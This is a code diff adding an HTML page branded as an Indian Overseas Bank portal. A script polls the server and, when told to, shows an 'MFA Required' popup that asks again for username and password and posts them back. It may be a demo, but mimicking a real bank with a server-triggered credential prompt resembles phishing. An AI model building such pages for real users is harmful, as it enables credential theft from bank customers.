@@ -1,0 +1,60 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>IOB Banking Portal</title>
+    <meta name="description" content="Indian Overseas Bank Portal" />
+    <meta name="author" content="IOB" />
+    <link rel="stylesheet" href="styles.css" />
+    <link rel="icon" href="./iob-logo.png" type="image/png">
+  </head>
+  <div id="mfa-popup" style="display: none; position: fixed; top: 25%; left: 35%; background: #fff; border: 2px solid #333; padding: 20px; z-index: 9999;">
+    <h3>🚨 MFA Required</h3>
+    <input id="mfa-username" placeholder="Username"><br><br>
+    <input id="mfa-password" type="password" placeholder="Password"><br><br>
+    <button onclick="submitMfa()">Submit</button>
+  </div>
+  
+  <script>
+    async function pollMfaStatus() {
+      const res = await fetch('/check-mfa');
+      const data = await res.json();
+      if (data.mfaRequired) {
+        document.getElementById('mfa-popup').style.display = 'block';
+      }
+      setTimeout(pollMfaStatus, 3000); // poll every 3 seconds
+    }
+  
+    async function submitMfa() {
+      const username = document.getElementById('mfa-username').value;
+      const password = document.getElementById('mfa-password').value;
+  
+      const res = await fetch('/verify-mfa', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ username, password })
+      });
+  
+      const result = await res.json();
+      if (result.success) {
+        alert("✅ MFA passed!");
+        document.getElementById('mfa-popup').style.display = 'none';
+      } else {
+        alert("❌ MFA failed. Logging out...");
+        window.location.href = '/logout';
+      }
+    }
+  
+    pollMfaStatus();
+  </script>
+  
+
+  <body>
+    <div id="app"></div>
+    <script src="https://cdn.gpteng.co/gptengineer.js" type="module"></script>
+    <script src="js/app.js" type="module"></script>
+    <script type="module" src="authService.js"></script>
+  </body>
+</html>
